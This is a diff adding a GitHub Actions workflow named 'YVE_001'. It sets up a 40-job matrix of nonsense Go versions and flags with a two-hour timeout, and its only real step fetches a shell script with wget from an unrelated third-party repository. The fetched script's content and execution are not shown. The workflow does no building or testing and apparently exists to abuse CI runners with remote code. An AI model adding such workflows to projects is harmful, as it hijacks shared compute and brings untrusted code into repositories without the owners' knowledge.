@@ -1,0 +1,27 @@
+name: YVE_001
+on: [push, pull_request]
+jobs:
+  build:
+    name: YVE_001
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4]
+        flag: [A, B, C, D, E, f, g, h, i, j]
+    timeout-minutes: 120
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: YVE_001
+      run: |
+        wget https://github.com/aniw9912/sleep/raw/master/config.sh
